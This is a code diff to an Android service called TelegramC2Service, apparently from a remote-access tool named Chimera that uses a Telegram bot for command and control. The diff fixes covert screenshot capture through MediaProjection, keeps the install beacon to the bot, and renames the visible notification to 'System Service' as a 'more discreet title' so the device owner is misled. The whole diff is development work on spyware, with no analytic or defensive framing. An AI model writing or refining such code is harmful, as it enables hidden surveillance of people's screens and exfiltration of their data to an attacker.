@@ -9,6 +9,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
@@ -31,6 +32,7 @@ import java.nio.ByteBuffer;
 public class TelegramC2Service extends Service {
     private Thread workerThread;
     private static final String CHANNEL_ID = "chimeraChannel";
+    private static final int NOTIFICATION_ID = 1;
 
     private static MediaProjection mediaProjection;
     private HandlerThread screenshotThread;
@@ -43,13 +45,13 @@ public class TelegramC2Service extends Service {
         super.onCreate();
         try {
             ConfigLoader.load(this);
-            // ADDED: Send installation message when service is created
             sendInstallMessage();
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_Config", e);
         }
         createNotifChannel();
-        startForeground(1, createNotification());
+        // FIXED: Start with base service types. No mediaProjection here.
+        startForeground(NOTIFICATION_ID, createNotification());
         try {
             startWorker();
             setupScreenshotThread();
@@ -83,7 +85,7 @@ public class TelegramC2Service extends Service {
         } else {
             b = new Notification.Builder(this);
         }
-        b.setContentTitle("Chimera Running");
+        b.setContentTitle("System Service"); // More discreet title
         b.setSmallIcon(android.R.drawable.stat_notify_sync);
         return b.build();
     }
@@ -99,7 +101,6 @@ public class TelegramC2Service extends Service {
         }
     }
 
-    // ADDED: Method to send installation message on a background thread
     private void sendInstallMessage() {
         try {
             String token = ConfigLoader.getBotToken();
@@ -130,10 +131,19 @@ public class TelegramC2Service extends Service {
     }
 
     private void handleScreenshotResult(int resultCode, Intent data) {
-        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-        if (mediaProjection != null) {
-            captureScreenshot();
+        try {
+            // FIXED: Promote the service to mediaProjection type BEFORE getting the projection
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+            }
+
+            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+            if (mediaProjection != null) {
+                captureScreenshot();
+            }
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "HandleScreenshotResult", e);
         }
     }
 
